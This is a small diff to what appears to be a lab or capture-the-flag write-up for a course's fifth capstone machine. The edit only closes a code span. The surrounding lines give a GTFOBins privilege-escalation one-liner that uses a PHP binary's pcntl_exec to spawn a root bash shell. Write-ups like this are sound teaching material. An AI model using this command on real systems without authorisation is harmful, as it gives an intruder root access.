@@ -80,7 +80,7 @@ This is my write-up for the fifth machine in the capstone section of the Practic
 
 - GTFOBins gives the command to escalte privileges.
 
-  `/usr/bin/php7.3 -r "pcntl_exec('/bin/bash', ['-p']);"
+  `/usr/bin/php7.3 -r "pcntl_exec('/bin/bash', ['-p']);"`
 
 - This spawned a shell running as root.
 
